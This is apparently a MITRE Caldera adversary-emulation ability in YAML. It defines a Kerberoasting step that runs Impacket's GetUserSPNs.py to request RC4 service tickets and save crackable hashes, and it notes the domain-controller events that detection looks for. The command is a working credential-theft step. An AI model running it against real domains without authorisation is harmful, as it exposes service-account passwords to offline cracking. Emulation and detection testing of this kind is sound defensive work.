---
- id: c1a1e001-0002-4a1a-9a11-000000000002
  name: Kerberoasting via Impacket GetUserSPNs
  description: |
    Requests TGS service tickets for all discoverable SPN-associated
    accounts using Impacket's GetUserSPNs.py, requesting tickets with
    RC4 (etype 23) encryption to enable offline cracking. Generates
    4769 (Kerberos service ticket requested) events with
    TicketEncryptionType 0x17 on the domain controller.
  tactic: credential-access
  technique:
    attack_id: T1558.003
    name: "Steal or Forge Kerberos Tickets: Kerberoasting"
  platforms:
    linux:
      sh:
        command: |
          python3 GetUserSPNs.py #{domain.name}/#{creds.user}:#{creds.pass} -dc-ip #{dc.ip} -request -outputfile hashes_kerberoast.txt
  requirements: []
  privilege: User
  repeatable: true
  singleton: false

  # Note: no `parsers:` block. Caldera v5's parser schema requires
  # purpose-built per-tool parser modules; no built-in parser exists
  # for raw Impacket Kerberoast output. Hashes are produced as a file
  # artifact but not auto-parsed into Caldera facts.
